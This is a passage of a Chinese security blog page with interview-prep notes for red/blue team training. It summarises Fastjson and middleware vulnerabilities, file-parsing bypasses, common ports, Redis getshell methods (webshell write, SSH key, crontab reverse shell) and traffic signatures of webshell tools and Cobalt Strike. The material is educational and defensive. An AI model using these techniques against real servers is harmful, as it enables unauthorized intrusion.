+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;@type&quot;:&quot;com.xxx.XXX&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12492">https://xz.aliyun.com/t/12492</a></p>
+<h4 id="Fastjson相关问题"><a href="#Fastjson相关问题" class="headerlink" title="Fastjson相关问题"></a>Fastjson相关问题</h4><ul>
+<li>了解fastjson漏洞吗？</li>
+<li>fastjson流量特征是什么？</li>
+<li>如何判断一个网站有没有fastjson漏洞？</li>
+<li>fastjson不出网怎么利用？</li>
+</ul>
+<h3 id="其他框架相关问题"><a href="#其他框架相关问题" class="headerlink" title="其他框架相关问题"></a>其他框架相关问题</h3><hr>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.bing.com/ck/a?!&&p=13336bd112ae2010JmltdHM9MTcxMzU3MTIwMCZpZ3VpZD0wZGU0NDlkMC1mNWU2LTY0N2MtMzQ0Yy01ZDgzZjRiYjY1MTAmaW5zaWQ9NTM3Ng&ptn=3&ver=2&hsh=3&fclid=0de449d0-f5e6-647c-344c-5d83f4bb6510&psq=struts2%E6%BC%8F%E6%B4%9E&u=a1aHR0cDovL3d3dy50b3BzZWMuY29tLmNuL3VwbG9hZHMvMjAyMS0xMi0xMC8yOTY0OGMzZS1mNDVjLTQ5MjUtYjkxMS0wNTNlZjI3MGVhOTExNjM5MTMyODQ1NzgxLnBkZg&ntb=1">Struts2框架漏洞了解吗？</a></li>
+<li>Struts2框架有哪些漏洞？</li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lingzhisec/p/15728886.html">tp框架漏洞了解吗？</a></li>
+<li>tp框架有哪些漏洞？</li>
+<li>SpringBoot有什么明显的特征？</li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/271347.html">SpringBoot有哪些类型的漏洞？</a></li>
+<li>python有哪些框架？出现过哪些漏洞？</li>
+</ul>
+<h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><hr>
+<p>很有可能让你列举几个漏洞 可以记一下：</p>
+<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><hr>
+<p>解析漏洞：多后缀名解析漏洞（从后往前解析，一直解析到可识别的后缀，如1.php.a.b,.b不认识，解析.a，还不认识就解析.php）、罕见后缀名解析漏洞、.htaccess解析漏洞，命令执行漏洞：CVE-2021-42013， 目录遍历</p>
+<h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><hr>
+<ol>
+<li>IIS 6.0文件名解析漏洞，从前往后解析，遇到分号就截断，忽略分号后面的内容，例如：1.asp;.jpg</li>
+<li>IIS 5.X&#x2F;6.0的文件夹解析漏洞，例如：将文件夹以1.asp命名，该文件夹中的所有文件都会被当做asp文件执行</li>
+<li>IIS 7.0&#x2F;IIS 7.5的CGI解析漏洞，例如上传1.jpg然后访问1.jpg&#x2F;.php</li>
+<li>HTTP.sys远程代码执行漏洞：MS15-034</li>
+<li>PUT漏洞</li>
+<li>短文件名猜解</li>
+</ol>
+<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><hr>
+<ol>
+<li>文件解析漏洞，早期版本,配置不当时,1.png图片马可以通过这样访问执行:1.png&#x2F;xxx.php</li>
+<li>空字节解析</li>
+<li>目录遍历</li>
+<li>CRLF注入（ 通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行） </li>
+<li>目录穿越</li>
+</ol>
+<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><hr>
+<ol>
+<li>远程代码执行 CVE-2019-0232</li>
+<li>弱口令+war后门文件部署</li>
+<li>任意文件写入（CVE-2017-12615）</li>
+</ol>
+<h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><hr>
+<ol>
+<li>反序列化漏洞</li>
+<li>任意文件上传</li>
+<li>war后门文件部署</li>
+</ol>
+<h3 id="中间件相关问题"><a href="#中间件相关问题" class="headerlink" title="中间件相关问题"></a>中间件相关问题</h3><hr>
+<ul>
+<li>Apache有哪些漏洞？</li>
+<li>Apache有哪些解析漏洞？</li>
+<li>NGINX有哪些漏洞？</li>
+<li>NGINX有哪些解析漏洞？</li>
+<li>IIS有哪些解析漏洞？</li>
+<li>weblogic有哪些类型的漏洞？</li>
+<li>Tomcat有哪些常见漏洞？</li>
+</ul>
+<h4 id="引申-4"><a href="#引申-4" class="headerlink" title="引申"></a>引申</h4><ul>
+<li>常见的文件上传绕过手法有哪些？</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46684578/article/details/119141109">.htaccess是什么你了解吗？</a></li>
+<li>.user.ini是什么你了解吗？</li>
+<li>为什么aspx木马权限比asp权限高？.NET</li>
+<li>常见的中间件漏洞有哪些？</li>
+</ul>
+<h1 id="常用-端口-协议-服务"><a href="#常用-端口-协议-服务" class="headerlink" title="常用&#x2F;端口&#x2F;协议&#x2F;服务"></a>常用&#x2F;端口&#x2F;协议&#x2F;服务</h1><h3 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h3><hr>
+<ul>
+<li><u>21端口：FTP 文件传输服务</u></li>
+<li><u>22端口：SSH协议、SCP（文件传输）、端口号重定向</u> </li>
+<li><u>23&#x2F;tcp端口：TELNET 终端仿真服务</u> </li>
+<li>25端口：SMTP 简单邮件传输协议 </li>
+<li><u>53端口：DNS 域名解析服务</u> </li>
+<li>69&#x2F;udp：TFTP </li>
+<li><u>80&#x2F;8080&#x2F;3128&#x2F;8081&#x2F;9098端口：HTTP协议代理服务器</u></li>
+<li><u>135、137、138、139端口： 局域网相关默认端口，应关闭</u></li>
+<li>389端口：LDAP（轻量级目录访问协议）、ILS（定位服务） </li>
+<li><u>443&#x2F;tcp 443&#x2F;udp：HTTPS服务器</u> </li>
+<li><u>445：SMB服务</u></li>
+<li>465端口：SMTPS（简单邮件传输协议安全版） </li>
+<li><u>873端口：rsync（Linux文件同步协议）</u> </li>
+<li><u>1433&#x2F;tcp&#x2F;udp端口：MS SQL<em>SERVER数据库server、MS SQL</em>SERVER数据库monitor</u> </li>
+<li><u>1521端口：Oracle 数据库</u> </li>
+<li><u>3389端口：WIN远程登录</u> RDP服务</li>
+<li><u>3306端口：MYSQL数据库端口</u> </li>
+<li><u>6379端口：Redis数据库端口</u> </li>
+<li><u>7001：weblogic</u></li>
+<li>8888端口：Nginx服务器的端口</li>
+</ul>
+<h3 id="端口相关问题"><a href="#端口相关问题" class="headerlink" title="端口相关问题"></a>端口相关问题</h3><hr>
+<ul>
+<li>weblogic端口是什么？</li>
+<li>mssql&#x2F;mysql&#x2F;oracle数据库&#x2F;redis端口是什么？</li>
+<li>DNS端口是什么？</li>
+<li>Windows远程登录（RDP服务）端口是什么？</li>
+<li>SMB服务端口是什么？</li>
+<li>21端口是什么服务？</li>
+<li>23端口对应什么服务？</li>
+<li>SSH服务端口是什么？</li>
+<li>8080端口一般是什么服务？</li>
+</ul>
+<h4 id="引申-5"><a href="#引申-5" class="headerlink" title="引申"></a>引申</h4><ul>
+<li>为什么一个MySQL数据库的站，只有一个80端口开放？</li>
+<li>端口扫描时，关注哪些端口？</li>
+<li>如果让你配置一个蜜罐，你会开放哪些端口？</li>
+<li>常见危险端口有哪些？</li>
+</ul>
+<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><hr>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>redis 服务以 root 账户运行(有.ssh目录并有写入权限)</li>
+<li>redis 无密码或弱密码进行认证（未授权）</li>
+<li>redis 监听在 0.0.0.0 公网上</li>
+</ul>
+<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><ul>
+<li>通过Redis的Info命令可以查看服务相关的参数和敏感信息（未授权。监听在 0.0.0.0 公网上且无密码或弱密码进行认证）</li>
+<li>写入webshell（存在未授权，有web目录的写入权限，写入webshell）</li>
+<li>上传SSH公钥获得SSH登录权限</li>
+<li>通过crontab反弹Shell</li>
+<li>利用Redis主从复制</li>
+</ul>
+<h3 id="Redis相关问题"><a href="#Redis相关问题" class="headerlink" title="Redis相关问题"></a>Redis相关问题</h3><ul>
+<li>Redis服务存在哪些漏洞？</li>
+<li>Redis服务漏洞利用条件有哪些？</li>
+<li>Redis漏洞如何利用？</li>
+<li>Redis如何getshell？</li>
+</ul>
+<h4 id="引申-6"><a href="#引申-6" class="headerlink" title="引申"></a>引申</h4><ul>
+<li>ssrf+Redis如何利用？gopher</li>
+</ul>
+<h1 id="流量特征-1"><a href="#流量特征-1" class="headerlink" title="流量特征"></a>流量特征</h1><h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><ol>
+<li>base64加密，解码有z0，z1，z2参数</li>
+<li>请求体中存在assert eavl，base64等特征字符 </li>
+<li>存在固定的QGluaV9zZXQo、@ini_set</li>
+<li>存在$_POST&#x2F;$_GET&#x2F;$_REQUEST</li>
+</ol>
+<h2 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h2><ol>
+<li>默认的USER-agent请求头是 antsword xxx，存在eval这种明显的特征</li>
+<li>最明显的特征为@ini_set(“display_errors”，”0”);</li>
+<li>参数名大多以”_0x”这种形式</li>
+</ol>
+<h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><p>3.0特征（回答首选）</p>
+<ul>
+<li>特征分析<strong>Content-Type: application&#x2F;octet-stream</strong> 这是一个<strong>强特征</strong> 查阅资料可知octet-stream的意思是，<strong>只能提交二进制，而且只能提交一个二进制</strong>，如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组）</li>
+<li>content-length长度为5720或5740(随Java版本改变)</li>
+<li>Accept头有application&#x2F;xhtml+xmlapplication&#x2F;xmlapplication&#x2F;signed-exchange属于弱特征（UA头的浏览器版本很老），或者说，内置16个ua头,比较老,属于n年前的浏览器产品,现在没什么人用</li>
+</ul>
+<p>4.0特征（常问）</p>
+<ul>
+<li>10个内置ua头随机选用</li>
+<li>端口为49700左右，每次连接会递增</li>
+<li>PHPwebshell存在固定代码</li>
+<li>请求头和响应头字节固定</li>
+<li>webshell存在默认字符串，为默认连接密码的MD5的前16位</li>
+<li>Content-type: application&#x2F;x-www-form-urlencoded</li>
+<li>特定的标记，如”flag&#x3D;0x52415631”</li>
+<li>Accept: application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01</li>
+<li>请求头connection为keep-alive</li>
+</ul>
+<h2 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h2><ul>
+<li>特定的标记，如”XORHEAD”和”XORBODY”</li>
+<li>Cookie中有一个非常关键的特征，最后会有个分号</li>
+<li>响应体的数据有一定特征，哥斯拉会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。</li>
+<li>请求中的Accept头是**<code>Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8</code>**</li>
+<li>响应头中的Cache-Control头是**<code>Cache-Control: no-store, no-cache, must-revalidate</code>**</li>
+<li>发送一段固定的payload，响应为空</li>
+<li>发送一段固定的test代码，执行结果为固定内容</li>
+<li>发送一段固定代码来获得基本信息</li>
+</ul>
+<h2 id="cs流量特征："><a href="#cs流量特征：" class="headerlink" title="cs流量特征："></a><strong>cs流量特征：</strong></h2><ul>
+<li>基础特征：心跳包，端口在50050附近</li>
+<li>请求特征：下发的指令，url路径，老版本固定的ua头</li>
+<li>源码特征：**<code>checksum8 （92L 93L）</code>**</li>
+</ul>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2024/07/06/hw培训/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OWASP-top10"><span class="toc-number">1.1.</span> <span class="toc-text">OWASP top10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#top10%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.1.</span> <span class="toc-text">top10相关问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.2.1.</span> <span class="toc-text">原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">1.2.2.</span> <span class="toc-text">类型有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5shell%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.3.</span> <span class="toc-text">写入shell条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5shell%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.4.</span> <span class="toc-text">写入shell方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-number">1.2.5.</span> <span class="toc-text">SQL注入防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87waf"><span class="toc-number">1.2.6.</span> <span class="toc-text">SQL注入绕过waf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.7.</span> <span class="toc-text">SQL注入相关问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E7%94%B3"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">引申</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.</span> <span class="toc-text">PHP反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">简述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.3.</span> <span class="toc-text">利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">1.3.4.</span> <span class="toc-text">PHP反序列化相关问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E7%94%B3-1"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">引申</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-CSRF-SSRF"><span class="toc-number">1.4.</span> <span class="toc-text">XSS&#x2F;CSRF&#x2F;SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.1.</span> <span class="toc-text">xss漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E3%80%81csrf%E6%BC%8F%E6%B4%9E%E3%80%81ssrf%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.4.2.</span> <span class="toc-text">xss、csrf漏洞、ssrf漏洞的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xxe%E6%BC%8F%E6%B4%9E%E4%BA%86%E8%A7%A3%E5%90%97%EF%BC%9F"><span class="toc-number">1.4.3.</span> <span class="toc-text">xxe漏洞了解吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-csrf-ssrf-xxe%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.4.</span> <span class="toc-text">xss&#x2F;csrf&#x2F;ssrf&#x2F;xxe漏洞相关问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E7%94%B3-2"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">引申</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6"><span class="toc-number">1.5.</span> <span class="toc-text">框架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j"><span class="toc-number">1.5.1.</span> <span class="toc-text">Log4j</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0-1"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">简述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%BA%E7%89%B9%E5%BE%81"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">强特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">攻击手法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%8F%AF%E7%94%A8%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">其他可用服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Log4j%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">1.5.1.5.</span> <span class="toc-text">Log4j相关问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro"><span class="toc-number">1.5.2.</span> <span class="toc-text">Shiro</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0-2"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">简述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#COOKIE%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">COOKIE加解密流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%BA%E7%89%B9%E5%BE%81-1"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">强特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">修复方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shiro%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">1.5.2.5.</span> <span class="toc-text">Shiro相关问题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%95%E7%94%B3-3"><span class="toc-number">1.5.2.5.1.</span> <span class="toc-text">引申</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson"><span class="toc-number">1.5.3.</span> <span class="toc-text">Fastjson</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0-3"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">简述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%86%E5%88%ABfastjson%E6%96%B9%E6%B3%95"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">识别fastjson方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">流量特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">不出网利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fastjson%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">1.5.3.5.</span> <span class="toc-text">Fastjson相关问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%A1%86%E6%9E%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">1.5.4.</span> <span class="toc-text">其他框架相关问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-number">1.6.</span> <span class="toc-text">中间件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache"><span class="toc-number">1.6.1.</span> <span class="toc-text">Apache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS"><span class="toc-number">1.6.2.</span> <span class="toc-text">IIS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx"><span class="toc-number">1.6.3.</span> <span class="toc-text">Nginx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat"><span class="toc-number">1.6.4.</span> <span class="toc-text">Tomcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebLogic"><span class="toc-number">1.6.5.</span> <span class="toc-text">WebLogic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">1.6.6.</span> <span class="toc-text">中间件相关问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E7%94%B3-4"><span class="toc-number">1.6.6.1.</span> <span class="toc-text">引申</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8-%E7%AB%AF%E5%8F%A3-%E5%8D%8F%E8%AE%AE-%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.</span> <span class="toc-text">常用&#x2F;端口&#x2F;协议&#x2F;服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.0.1.</span> <span class="toc-text">常用端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">2.0.2.</span> <span class="toc-text">端口相关问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E7%94%B3-5"><span class="toc-number">2.0.2.1.</span> <span class="toc-text">引申</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis"><span class="toc-number">2.1.</span> <span class="toc-text">Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.2.</span> <span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98"><span class="toc-number">2.1.3.</span> <span class="toc-text">Redis相关问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E7%94%B3-6"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">引申</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81-1"><span class="toc-number">3.</span> <span class="toc-text">流量特征</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8F%9C%E5%88%80"><span class="toc-number">3.1.</span> <span class="toc-text">菜刀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%9A%81%E5%89%91"><span class="toc-number">3.2.</span> <span class="toc-text">蚁剑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E"><span class="toc-number">3.3.</span> <span class="toc-text">冰蝎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">3.4.</span> <span class="toc-text">哥斯拉</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cs%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%EF%BC%9A"><span class="toc-number">3.5.</span> <span class="toc-text">cs流量特征：</span></a></li></ol></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2024/07/06/MySql数据库注入/"></a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2024/07/06/hw培训/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello~大噶好。唔系love睡觉，欢迎你们来到我的温馨小屋，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://cheng1g.github.io/">https://cheng1g.github.io/</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
